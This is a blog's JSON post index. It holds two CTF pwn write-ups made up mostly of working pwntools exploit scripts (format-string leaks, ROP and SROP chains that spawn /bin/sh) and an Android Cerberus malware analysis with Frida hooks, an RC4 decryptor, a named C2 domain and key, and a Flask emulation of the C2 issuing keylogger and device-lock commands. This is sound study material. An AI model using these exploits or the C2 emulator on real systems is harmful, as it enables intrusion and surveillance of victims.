[ { "title": "Single Note - Ignite khi qualifying 2024", "url": "/posts/Single_Note/", "categories": "Pwn, amd64, ctf", "tags": "", "date": "2024-10-30 00:00:00 +0800", "snippet": "Purpose : Get The FlagMitigations :Crash :Decompile :#!/usr/bin/python3from pwn import *import struct# context.terminal = ['tmux','splitw','-h']os.environ['XDG_CACHE_HOME'] = '/tmp/'context.log_level = 'error'info = lambda msg: log.info(msg)sla = lambda msg, data: io.sendlineafter(msg, data)sa = lambda msg, data: io.sendafter(msg, data)sl = lambda data: io.sendline(data)s = lambda data: io.send(data)# Allows you to switch between local/GDB/remote from terminaldef start(argv=[], *a, **kw): if args.GDB: # Set GDBscript below return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw) elif args.REMOTE: # ('server', 'port') return remote(sys.argv[1], sys.argv[2], *a, **kw) else: # Run locally return process([exe] + argv, *a, **kw)# Specify GDB script here (breakpoints etc)gdbscript = '''break *main+247continuecontinuecontinuecontinue'''.format(**locals())exe = './bin'; elf = context.binary = ELF(exe);exe_rop = ROP(elf,checksec=False)libc = elf.libc ; libc_rop = ROP(libc)io = start()payload =b\"\"payload +=b\"%13$p\"payload +=b\"A\"*(256-len(payload))io.sendlineafter(b\"Choice: \",b\"3\")io.sendlineafter(b\"nter new content length:\",b\"512\")io.sendlineafter(b\"Enter new content:\",payload)io.sendafter(b\"Choice: \",b\"2\")leak=u64(io.recvuntil(b\"1.\").split(b\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\")[1].split(b\"\\n\")[0]+b\"\\x00\"*2)print(f\"pie Leak :: {hex(leak)}\")elf.address = leak - 5073print(f\"pie base :: {hex(elf.address)}\")payload =b\"\"payload +=b\"%3$p\" ## speciall thanks to Hassan aka @72goul for turning this into format string to get libc leak from stackpayload +=b\"A\"*(256-len(payload))payload +=p64(elf.address+0x1100)#payload = b\"aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacnaaaaaac\"io.sendlineafter(b\"Choice: \",b\"3\")io.sendlineafter(b\"nter new content length:\",b\"512\")io.sendlineafter(b\"Enter new content:\",payload)io.sendafter(b\"Choice: \",b\"0\")io.recvuntil(b\"Invalid!\\n\")leak_libc = int(io.recvline().split(b\"AAAAAA\")[0],16)print(f\"Libc leak :: {hex(leak_libc)}\")libc = elf.libc ; libc_rop = ROP(libc)libc.address = leak_libc -1132679print(f\"Libc address :: {hex(libc.address)}\")payload =b\"\"payload +=b\"/bin/sh\\x00\"payload +=b\"A\"*(256-len(payload))payload +=p64(libc.address+330323)#payload = b\"aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacnaaaaaac\"io.sendlineafter(b\"Choice: \",b\"3\")io.sendlineafter(b\"nter new content length:\",b\"512\")io.sendlineafter(b\"Enter new content:\",payload)io.sendafter(b\"Choice: \",b\"0\")io.recvuntil(b\"Invalid!\\n\")io.interactive()" }, { "title": "BlackHat Qualifier cockatoo", "url": "/posts/cockatoo_BlackHat_2024_Qualifier/", "categories": "Pwn, amd64, ctf", "tags": "", "date": "2024-10-27 00:00:00 +0800", "snippet": "Purpose : Get The Flag#!/usr/bin/python3from pwn import *import structfrom ctypes import *import subprocess context.terminal = ['tmux','splitw']os.environ['XDG_CACHE_HOME'] = '/tmp/'context.log_level = 'ERROR'# Allows you to switch between local/GDB/remote from terminaldef start(argv=[], *a, **kw): if args.GDB: # Set GDBscript below return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw) elif args.REMOTE: # ('server', 'port') return remote(sys.argv[1], sys.argv[2], *a, **kw) else: # Run locally return process([exe] + argv, *a, **kw) # Specify GDB script here (breakpoints etc)gdbscript = '''break *main+209continue'''.format(**locals())#exe = '/challenge/babyrop_level10.1'; elf = context.binary = ELF(exe)exe = './bin'; elf = context.binary = ELF(exe)libc = elf.libc c = constantsexe_rop = ROP(elf,checksec=False)io = start()payload = b\"\"payload += b\"\\x50\"*0x100+b\"\\x17\"payload += p64(exe_rop.find_gadget([ 'pop rax','ret' ])[0])payload += p64(15) #SYS_Sigreturnpayload += p64(exe_rop.find_gadget([ 'syscall' ])[0])frame = SigreturnFrame()frame.rax = constants.SYS_execve frame.rdi = 0x45frame.rsi = 0frame.rdx = 0frame.rsp = 0x404900frame.rip = elf.sym.main #exe_rop.find_gadget([ 'syscall' ])[0]payload += bytes(frame)io.sendline(payload)sleep(1)payload = b\"\\x00\\x00/bin/sh\\x00\"payload += b\"\\x50\"*(0x100-len(payload))payload += b\"\\x17\"payload += p64(exe_rop.find_gadget([ 'pop rax','ret' ])[0])payload += p64(15) #SYS_Sigreturnpayload += p64(exe_rop.find_gadget([ 'syscall' ])[0])frame = SigreturnFrame()frame.rax = constants.SYS_execve frame.rdi = 0x4047eaframe.rsi = 0frame.rdx = 0frame.rsp = 0x403050frame.rip = exe_rop.find_gadget([ 'syscall' ])[0]payload += bytes(frame)io.sendline(payload)print(f\"payload 2 :: {payload}\")io.interactive()" }, { "title": "Cereberus 2024", "url": "/posts/98ec204106d3e4d225d14217d9e16f106f5d8f0e3d1c8c1a3eb4d6184f7316d7/", "categories": "Malware, Android", "tags": "", "date": "2024-03-17 00:00:00 +0800", "snippet": "First, we begin with basic analysis. This involves checking its hash on VirusTotal and extracting hashes using HashMyFile.Checking on VirusTotal.After obtaining some hits, it‚Äôs time to invest more time in understanding its workings. While we can check for relations on VirusTotal, I prefer to handle the analysis independently from this point onward. Since the file type is apk, we can utilize jadx-gui for a more in-depth analysis.We proceed by checking the native libraries to determine which architecture is supported. In this case, we were fortunate that it supports x86. Therefore, we don‚Äôt need to delve into the hassle of emulating other architectures for dynamic analysis.Checking the Manifest File for entry points and the permissions the app is requesting is crucial for understanding its functionality. Permissions provide hints about the type of activities we can anticipate from the sample. In this case, permissions such as accessing SMS, recording audio, using the camera, accessing location, and reading external storage suggest spyware capabilities once confirmed as malware.Other noteworthy permissions include writing permission to external storage, indicating a potential for downloading the next stage to obscure file paths to avoid association. This speculation proved true in this case. Post notification permissions may be utilized to lure victims into engaging in nefarious activities. Bluetooth permissions can also be leveraged to discover other available devices nearby.Before the main function is called, we observe com.cliff.own.KTcMkQrAeSoAqTtWfHlDgHtBwInHdYfLaPiShZsIh being invoked.From this point onward, I‚Äôll focus on crucial parts of the analysis. We observe the use of techniques to create strings at runtime. One solution is to copy and paste the Java code provided by JADX, replacing Android native code with Java code. Alternatively, we can hook these functions using Frida to observe the arguments being passed and the values being returned. In this case, it resolves to Android.app.ActivityThread.There were strings intended as taunts by the malware author, such as Use the same scan engine, the same virus definition of the world's top commercial antivirus software.After spending some time analyzing the code statically, it was discovered that it is dynamically loading classes, which solves the mystery of ru..... It appears that this method is dynamically loaded from /data/user/0/com.cliff.own/app_DynamicOptDex/hjAWR.json. Some hurdles were encountered where certain code seemed to be added merely for distraction. At times, it appears to be doing nothing significant, while other times it performs actions that can be safely ignored, as illustrated in the example below. if (find_full_path) { this.const_int_3246 = (this.const_int_16462 * 44) + 66 + this.const_int_8284; StringBuffer stringBuffer = new StringBuffer(); for (int i10 = 0; i10 &lt; 5; i10++) { this.const_int_8284 = ((this.const_int_3246 - 16) + 43) - this.const_int_16462; } if (find_full_path) { wrapper_for_loading_class(full_path_to_hjAWR_json, file_get_absolutePath, stringBuffer, this.context_null); // FEaGuJtZkDePjRpCyMjAgAx.staffhoney is called: field=private java.lang.ClassLoader android.app.LoadedApk.mClassLoader, str=/data/user/0/com.cliff.own/app_DynamicOptDex/hjAWR.json, str2=/data/user/0/com.cliff.own/app_DynamicOptDex, str3=, weakReference=java.lang.ref.WeakReference@e9db828 for (int i11 = 1; i11 &lt; 22; i11++) { // FEaGuJtZkDePjRpCyMjAgAx.staffhoney is called: field=private java.lang.ClassLoader android.app.LoadedApk.mClassLoader, str=/data/user/0/com.cliff.own/app_DynamicOptDex/hjAWR.json, str2=/data/user/0/com.cliff.own/app_DynamicOptDex, str3=, weakReference=java.lang.ref.WeakReference@e9db828 this.const_int_3246 = (-1773) + this.const_int_16462 + this.const_int_8284 + this.const_int_3246; } }// code is clean by me to get some sense of what happening . After inspecting the path, it was found that the hjAWR.json file is not a JSON file, as the code hinted. Instead, it turned out to be a zip file containing a classes.dex file upon unzipping it. Hashes of both hjAWR.json and classes.dex files were checked. There were no hits on VirusTotal (VT).Some of the Frida hook scripts I have utilized up to this juncture, with their outputs provided as comments.Java.perform(()=&gt;{let JUjCsQtEjYlSwRzKkHtGrJfRqThOhBmJcBq = Java.use(\"com.cliff.own.JUjCsQtEjYlSwRzKkHtGrJfRqThOhBmJcBq\");JUjCsQtEjYlSwRzKkHtGrJfRqThOhBmJcBq[\"middlegravity\"].implementation = function (str, context, str2) { console.log(`JUjCsQtEjYlSwRzKkHtGrJfRqThOhBmJcBq.middlegravity is called: str=${str}, context=${context}, str2=${str2}`); let result = this[\"middlegravity\"](str, context, str2); console.log(`JUjCsQtEjYlSwRzKkHtGrJfRqThOhBmJcBq.middlegravity result=${result}`); return result;};})OUTPUT ::::Pixel 3::com.cliff.own ]-&gt; JUjCsQtEjYlSwRzKkHtGrJfRqThOhBmJcBq.middlegravity is called: str=/data/user/0/com.cliff.own/app_DynamicOptDex/hjAWR.json, context=android.app.ContextImpl@522362f, str2=hjAWR.jsonJUjCsQtEjYlSwRzKkHtGrJfRqThOhBmJcBq.middlegravity result=trueJava.perform(()=&gt;{let first_func_call = Java.use(\"com.cliff.own.KTcMkQrAeSoAqTtWfHlDgHtBwInHdYfLaPiShZsIh\");first_func_call[\"mustready\"].implementation = function (str, str2, stringBuffer, context) { console.log(`first_func_call.mustready is called: str=${str}, str2=${str2}, stringBuffer=${stringBuffer}, context=${context}`); this[\"mustready\"](str, str2, stringBuffer, context);};})OUTPUT :::: first_func_call.mustready is called: str=/data/user/0/com.cliff.own/app_DynamicOptDex/hjAWR.json, str2=/data/user/0/com.cliff.own/app_DynamicOptDex, stringBuffer=, context=android.app.ContextImpl@e9db828Java.perform(()=&gt;{let FEaGuJtZkDePjRpCyMjAgAx = Java.use(\"com.cliff.own.FEaGuJtZkDePjRpCyMjAgAx\");FEaGuJtZkDePjRpCyMjAgAx[\"staffhoney\"].implementation = function (field, str, str2, str3, weakReference) { console.log(`FEaGuJtZkDePjRpCyMjAgAx.staffhoney is called: field=${field}, str=${str}, str2=${str2}, str3=${str3}, weakReference=${weakReference}`); this[\"staffhoney\"](field, str, str2, str3, weakReference);};})OUTPUT ::::[Pixel 3::com.cliff.own ]-&gt; FEaGuJtZkDePjRpCyMjAgAx.staffhoney is called: field=private java.lang.ClassLoader android.app.LoadedApk.mClassLoader, str=/data/user/0/com.cliff.own/app_DynamicOptDex/hjAWR.json, str2=/data/user/0/com.cliff.own/app_DynamicOptDex, str3=, weakReference=java.lang.ref.WeakReference@e9db828Java.perform(()=&gt;{let first_func_call = Java.use(\"com.cliff.own.KTcMkQrAeSoAqTtWfHlDgHtBwInHdYfLaPiShZsIh\");first_func_call[\"patchverify\"].implementation = function (str) { console.log(`first_func_call.patchverify is called: str=${str}`); let result = this[\"patchverify\"](str); console.log(`first_func_call.patchverify result=${result}`); return result;};})OUTPUT ::::[Pixel 3::com.cliff.own ]-&gt; first_func_call.patchverify is called: str=first_func_call.patchverify result=falselet report_recieveSMSnStartJobs = Java.use(\"ru.plaintiff.whale.strongFlashClam\");report_recieveSMSnStartJobs[\"a\"].implementation = function (str) { console.log(`report_recieveSMSnStartJobs.a is called: str=${str}`); let result = this[\"a\"](str); console.log(`report_recieveSMSnStartJobs.a result=${result}`); return result;};OUTPUT ::::# Base64_decode Func[Pixel 3::com.cliff.own ]-&gt; report_recieveSMSnStartJobs.a is called: str=YnJvYWRjYXN0X3N3aXBlX3RvX3VubG9ja19hY3Rpb24=report_recieveSMSnStartJobs.a result=broadcast_swipe_to_unlock_actionreport_recieveSMSnStartJobs.a is called: str=c3RvcA==report_recieveSMSnStartJobs.a result=stopreport_recieveSMSnStartJobs.a is called: str=YW5kcm9pZC5pbnRlbnQuYWN0aW9uLlVTRVJfUFJFU0VOVA==report_recieveSMSnStartJobs.a result=android.intent.action.USER_PRESENTreport_recieveSMSnStartJobs.a is called: str=YW5kcm9pZC5pbnRlbnQuYWN0aW9uLlNDUkVFTl9PRkY=report_recieveSMSnStartJobs.a result=android.intent.action.SCREEN_OFFreport_recieveSMSnStartJobs.a is called: str=YW5kcm9pZC5pbnRlbnQuYWN0aW9uLlNDUkVFTl9PTg==report_recieveSMSnStartJobs.a result=android.intent.action.SCREEN_ONAdding the classes.dex file in jadx allows us to unlock locked functions üòè , granting access to previously inaccessible portions of the code. We started with ru.plaintiff.whale.evilRealizeCake, which is called when the user initially launches the app with the launcher icon. It‚Äôs a complete mess initially. After investing more time to make sense of the code, we found ru.plaintiff.whale.h being referenced repeatedly with some numbers passed to it. It has three methods: b, a lengthy method with numerous switch statements, and upon returning from this method, a is called. It invokes c and several other methods.In short, the description involves applying a base64 encoding followed by an RC4 decryption routine to resolve strings at runtime, with the RC4 key derived from the provided string. This function proved to be time-consuming. A Java code was written (provided with attachments) to dump all the encrypted strings.Now, let‚Äôs focus on how communication is established, if any. To do so, we installed the app inside Genymotion and started intercepting traffic. We observed a request being made to a domain.Just to clarify our suspicions, we checked the domain on VirusTotal. We were able to find one more sample associated with this domain, further corroborating our findings.After installation, I observed a particular behavior. The app renders a fake ‚ÄúAccessibility‚Äù page. Upon clicking anywhere on the page, it redirects to the device settings, prompting the user to grant permissions to the app.The page mentioned above was confirmed to render because the emulator was in Dark mode, while the page rendered in light mode. Additionally, HTML code was found in decoded strings, further supporting this observation.In this case, the malware author impersonated WhatsApp in the initial rendering of the page. However, during the permission request process, it impersonated Google Chrome, adding another layer of deception to its tactics.After installing the app and granting permissions, accessing the app details would automatically navigate back to the home screen through repeated back clicks, making it challenging to remove. Despite some attempts, I managed to uninstall the app using the Android UI. However, after rebooting, the app reappeared, indicating persistence mechanisms that are currently unknown.Let‚Äôs examine how the HTTP connection is established. I began by searching for methods related to httpconnection and POST, and then cross-referenced them. After some time, I found this code snippet.Using cross-referencing and unraveling, and subsequently renaming method names, I found the piece of code responsible for the body of the HTTP request.It‚Äôs time to uncover the C2 domain name. This code had me pulling my hair out. The malware author achieved their goal by crafting a string comprised of the decrypted strings (base64 + RC4), MD5 sum, and another decrypted string (base64 + RC4). It formed as follows: http + MD5(date) + .xyz. Initially, I thought the domain name was dynamically generated, sparking the idea that we could expose all future domains that this family might use.The dynamically generated domain name was of a fixed 32-character size, confirming my theory. I invested significant time in creating a domain name using dynamic analysis. I even tested a newly formed domain name like 572e04c71b52ecd47154544142470f03.xyz, which returned the same ‚ÄúForbidden‚Äù response as the original domain. However, the response differed for POST requests, leading me to believe it might not be set up currently but could be in the future.Two questions plagued my mind: first, how is the original domain name generated, and second, is my dynamic theory correct? To address the first question, I even scripted and began brute-forcing all calendar combinations for comparison. As for the second, it may have been intentional or coincidental, but it certainly became a rabbit hole.import hashlibimport socketdef make_number(day,month,year): i3 = 5 if day &gt;= 10: if day &lt; 20 and day &gt; 10: i3 = 15 elif day &gt;20: i3 = 25 num = int(str(month)+str(i3)+str(year)) num *= 159 return numdef check_domain_existence(domain): try: socket.gethostbyname(domain) return True except socket.error: return Falsefor i in range(12): for j in range(1,4): num = str(make_number((9*j),i,2024)) md5sum = hashlib.md5(num.encode('utf-8')).hexdigest() url = md5sum + \".xyz\" if check_domain_existence(url): print(url + \" exists, month = \" + str(i) + \" day = \" + str(9*j))import hashlibblob = \"252024\"for i in range(160): tmp = str(int(blob)*i) md5sum = hashlib.md5(tmp.encode('utf-8')).hexdigest() print(f\"i :{i} :: mdsum : {md5sum}\") if (md5sum == \"1z06mx6i9sdxxh1xaspbj87fh8qy8pu0\"): break;After carefully explaining the code‚Äôs functionality to myself, I realized I made a big mistake. The C2 domain name was being extracted by getSharedPreference_ring0. All my theories were washed down the drain. It‚Äôs frustrating when things don‚Äôt go as expected, but understanding the mistake is a crucial part of the learning process üò≠ .It‚Äôs time to examine how packet data is encrypted. For this, RC4 encryption with the key E0NX was used, which was also resolved at runtime. Here‚Äôs an example of one of the data packets being sent to the C2.One interesting behavior was that whenever we attempted to uninstall the app, it would first thwart our efforts by navigating back repeatedly and then send a message to the C2.One more interesting thing I noticed was that the C2 server backend had its ‚ÄúDebug‚Äù mode enabled. When I sent a malformed packet to the server, it crashed, inadvertently leaking the C2 server backend code. Additionally, it also leaked the RC4 key E0NX. I was able to extract some details from this Missconfiguration.Malformed PacketPOST / HTTP/1.1Content-Length: 285Content-Type: application/x-www-form-urlencodedUser-Agent: Dalvik/2.1.0 (Linux; U; Android 10; Pixel 3 Build/QQ1D.200105.002)Host: 1z06mx6i9sdxxh1xaspbj87fh8qy8pu0.xyzConnection: closeAccept-Encoding: gzip, deflate, brdata=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAfter delving deeper, I found another interesting detail: tychef.C2 communication can also be hooked using Frida.Java.perform(()=&gt;{Java.openClassFile(\"/data/user/0/com.cliff.own/app_DynamicOptDex/hjAWR.json\").load();let a = Java.use(\"ru.plaintiff.whale.c$a\");a[\"doInBackground\"].implementation = function (str, str2) { console.log(`a.doInBackground is called str=${str}, str2=${str2}`); let result = this[\"doInBackground\"](str, str2); console.log(`a.doInBackground result=${result}`); return result;};let c = Java.use(\"ru.plaintiff.whale.c\");c[\"a\"].implementation = function (str, str2) { console.log(`c.a is called: str=${str}, str2=${str2}`); let result = this[\"a\"](str, str2); console.log(`c.a result=${result}`); return result;};})After all this, it‚Äôs time to delve into the functionality of the malware. After googling what getprop ro.miui.ui.version.name does, I found‚Ä¶After going through all these links, I found a report by ‚ÄúCyber Wise‚Äù which identified the family as Cerberus. Upon reading it, I discovered a lot of functionalities and similarities, not just in behavior but also in code reuse. Here are some examples:https://edu.anarcho-copy.org/Against%20Security%20-%20Self%20Security/Cerberus.pdfcerebrusOur sample code may be slightly different, but the same functionality was observed using dynamic analysis.cereberusOur SamplecereberusOur SampleAlso Find this traffic too . It can also part which need more attention.GET /+vSpP6RRKB35iM2M0 HTTP/1.1User-Agent: Dalvik/2.1.0 (Linux; U; Android 10; Pixel 3 Build/QQ1D.200105.002)Host: t.meConnection: closeAccept-Encoding: gzip, deflate, brScript to decrypt strings from binary and internet#!/usr/bin/python3import binasciiimport hashlibimport base64def rc4(key, data): x = 0 box = list(range(256)) for i in range(256): x = (x + box[i] + key[i % len(key)]) % 256 box[i], box[x] = box[x], box[i] x = 0 y = 0 out = [] for char in data: x = (x + 1) % 256 y = (y + box[x]) % 256 box[x], box[y] = box[y], box[x] out.append(chr(char ^ box[(box[x] + box[y]) % 256])) return ''.join(out)def decrypting_bin(data):\tkey = data[:12]\tenc_data = data[12:]\tprint(f\"Key :::: {key} \")\tprint(f\"Encrypted data base64 encoded ::::: {enc_data}\")\tkey=bytes(key,'utf-8')\tenc_data = base64.b64decode(enc_data).decode('utf-8')\tenc_data = bytes.fromhex( enc_data )\tdecrypted_payload = rc4(key,enc_data)\tprint(\"+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+\")\tprint(f\"Decrypted Data {decrypted_payload} \")\tprint(\"+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+\")\treturn decrypted_payloaddef decrypting_net(data):\t\tkey = b\"E0NX\"\t\tenc_data = bytes.fromhex( base64.b64decode(data).decode('utf-8') )\t\tdecrypted_payload = rc4(key,enc_data)\tprint(\"+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+\")\tprint(f\"Decrypted Data {decrypted_payload} \")\tprint(\"+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+\")\treturn decrypted_payloaddef option_2():\twhile True:\t\tprint(\"Enter Strings to Decode Or 'Exit' to get Back To Menu ::\")\t\tstr_1 = input()\t\tif str_1 == 'Exit':\t\t\tprint(\"Exiting...........\")\t\t\tbreak\t\ttry:\t\t\tdecrypting_bin(str_1)\t\texcept Exception as e: \t\t\tprint(\"+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+\")\t\t\tprint(f\"Error Encounter ::::::: Reason :: {e}\")\t\t\tprint(\"+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+\")def option_1():\twhile True:\t\tprint(\"Enter Strings to Decode Or 'Exit' to get Back To Menu ::\")\t\tstr_1 = input()\t\tif str_1 == 'Exit':\t\t\tprint(\"Exiting...........\")\t\t\tbreak\t\ttry:\t\t\tdecrypting_net(str_1)\t\texcept Exception as e: \t\t\tprint(\"+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+\")\t\t\tprint(f\"Error Encounter ::::::: Reason :: {e}\")\t\t\tprint(\"+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+\")while True:\tprint(\"+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+\")\tprint(f\"1. Network traffic \\n2. String inside classes.dex \\nOption 1 or 2 ::\")\toption=input()\t\tif option =='2':\t\toption_2()\telif option =='1':\t\toption_1()\telse:\t\t\tprint(\"Select Correction Option \")Recreated backend of c2 server only 2 Commands are emulating at this point#!/usr/bin/python3import osfrom flask import Flask,requestimport binasciiimport hashlibimport base64ROOT_PATH = os.environ.get('ROOT_PATH')app = Flask(__name__)def rc4(key, data): x = 0 box = list(range(256)) for i in range(256): x = (x + box[i] + key[i % len(key)]) % 256 box[i], box[x] = box[x], box[i] x = 0 y = 0 out = [] for char in data: x = (x + 1) % 256 y = (y + box[x]) % 256 box[x], box[y] = box[y], box[x] out.append(chr(char ^ box[(box[x] + box[y]) % 256])) return ''.join(out)def rc4_hex(key, data): x = 0 box = list(range(256)) for i in range(256): x = (x + box[i] + key[i % len(key)]) % 256 box[i], box[x] = box[x], box[i] x = 0 y = 0 out = [] for char in data: x = (x + 1) % 256 y = (y + box[x]) % 256 box[x], box[y] = box[y], box[x] tmp = hex(char ^ box[(box[x] + box[y]) % 256])[2:] if len(tmp) == 1: tmp = '0'+tmp out.append(tmp) else : out.append(tmp) return ''.join(out)global_variable_command = \"\"global_variable_response = \"\"def decrypting_net(data): key = b\"E0NX\" enc_data = bytes.fromhex( base64.b64decode(data).decode('utf-8') ) decrypted_payload = rc4(key,enc_data) print(\"+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+\") print(f\"Decrypted Data {decrypted_payload} \") print(\"+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+\") global_variable_response = dec_payload return decrypted_payloaddef encrypt_res(data): key = b\"E0NX\" enc_rc4 = rc4_hex(key,data.encode('utf-8')) payload = enc_rc4 print(payload) payload = base64.b64encode( enc_rc4.encode('utf-8') ).decode('utf-8') print(\"+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+\") print(f\"Command responding with ::: {data} \" ) print(\"+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+\") global_variable_command = data return payload#Command = '{\"this\":\"device_no_cmd\"}' # cmd 1Command = '{\"this\":\"device_settings#\",\"hideSMS\":\"1\",\"lockDevice\":\"1\",\"offSound\":\"1\",\"keylogger\":\"1\",\"lock_record\":\"1\",\"endless_start\":\"1\",\"it\":\"1\",\"nt\":\"1\",\"ci\":\"\",\"ki\":\"\",\"record_call\":\"1\",\"activeInjection\":\"\"}' # cmd 2@app.route('/', methods=['POST'])def success(): if request.method == 'POST': enc_payload = request.form.get('data') try: dec_payload = decrypting_net(enc_payload) except Exception as dec_payload: print(f\"Error Encounter ::::::: Reason :: {dec_payload}\") send_payload = encrypt_res(Command) print(send_payload) filename = \"Logging_response_from_malware\" with open(filename, \"a\") as f: f.write(\"+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+\") f.write(f\"Command responding with :::\\n\" ) f.write(global_variable_command ) f.write(\"\\n+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+\\n\") f.write(\"+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+\\n\") f.write(global_variable_response ) f.write(\"\\n+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+\\n\") return f'{send_payload}'app.run(port=80,debug=True)After responding to the beacon with the configuration enabling the lock device option, it locks the machine and won‚Äôt let you use it.If the PIN is enabled and the C2 configuration responds with {‚Äúlock_record‚Äù:‚Äù1‚Äù}, which is enabled by default, on the c2 infra , after attempting to uninstall it, the operator will be alerted about the attempt, and at the same time, the PIN will be sent to the operator. A major flaw I observed is that it will send all entries of the PIN given to the lock screen, which means the malware does not differentiate between the wrong and correct PIN.frida script that hooks function which will be parsing c2 config responseJava.perform(()=&gt;{Java.openClassFile(\"/data/user/0/com.cliff.own/app_DynamicOptDex/hjAWR.json\").load();let j = Java.use(\"ru.plaintiff.whale.j\");j[\"r\"].implementation = function (context, str, str2, str3) { console.log(`j.sendin_id_drt_lg_send_sms is called: context=${context}, str=${str}, str2=${str2}, str3=${str3}`); let result = this[\"r\"](context, str, str2, str3); console.log(`j.sendin_id_drt_lg_send_sms result=${result}`); return result;};});j.sendin_id_drt_lg_send_sms is called: context=ru.plaintiff.whale.wantingChooseVoice@b42996a, str=Blocked attempt to disable accessibility service[143523#]Blocked attempt to disable accessibility service[143523#]Blocked attempt to disable accessibility service[143523#]Blocked attempt to disable accessibility service[143523#], str2=7qlz-emc0-re1z-ymv5, str3=saved_data_device&amp;j.sendin_id_drt_lg_send_sms result={\"this\":\"device_settings#\",\"hideSMS\":\"0\",\"lockDevice\":\"0\",\"offSound\":\"0\",\"keylogger\":\"0\",\"lock_record\":\"1\",\"endless_start\":\"0\",\"it\":\"0\",\"nt\":\"0\",\"ci\":\"\",\"ki\":\"\",\"record_call\":\"0\",\"activeInjection\":\"\"}this frida script is responsible for recording movement on screen. let abortiveSendChin = Java.use(\"ru.plaintiff.whale.abortiveSendChin\"); abortiveSendChin[\"j\"].implementation = function (str, accessibilityEvent) { console.log(`abortiveSendChin.j is called: str=${str}, accessibilityEvent=${accessibilityEvent}`); this[\"j\"](str, accessibilityEvent); };Text: ---&gt; box consists of button pressabortiveSendChin.j is called: str=com.android.systemui, accessibilityEvent=EventType: TYPE_WINDOW_CONTENT_CHANGED; EventTime: 6665820; PackageName: com.android.systemui; MovementGranularity: 0; Action: 0; ContentChangeTypes: [CONTENT_CHANGE_TYPE_SUBTREE, CONTENT_CHANGE_TYPE_TEXT, CONTENT_CHANGE_TYPE_CONTENT_DESCRIPTION]; WindowChangeTypes: [] [ ClassName: android.widget.FrameLayout; Text: []; ContentDescription: null; ItemCount: -1; CurrentItemIndex: -1; Enabled: true; Password: false; Checked: false; FullScreen: false; Scrollable: false; BeforeText: null; FromIndex: -1; ToIndex: -1; ScrollX: -1; ScrollY: -1; MaxScrollX: -1; MaxScrollY: -1; AddedCount: -1; RemovedCount: -1; ParcelableData: null ]; recordCount: 0+---------------------------------------------------------------------------------------------------------------------------------------------------------+abortiveSendChin.j is called: str=com.android.systemui, accessibilityEvent=EventType: TYPE_VIEW_TEXT_CHANGED; EventTime: 6844438; PackageName: com.android.systemui; MovementGranularity: 0; Action: 0; ContentChangeTypes: []; WindowChangeTypes: [] [ ClassName: android.widget.EditText; Text: [\\u2022\\u2022]; ContentDescription: PIN area; ItemCount: -1; CurrentItemIndex: -1; Enabled: true; Password: true; Checked: false; FullScreen: false; Scrollable: false; BeforeText: \\u2022; FromIndex: 1; ToIndex: -1; ScrollX: -1; ScrollY: -1; MaxScrollX: -1; MaxScrollY: -1; AddedCount: 1; RemovedCount: 0; ParcelableData: null ]; recordCount: 0abortiveSendChin.j is called: str=com.android.systemui, accessibilityEvent=EventType: TYPE_VIEW_CLICKED; EventTime: 6844463; PackageName: com.android.systemui; MovementGranularity: 0; Action: 0; 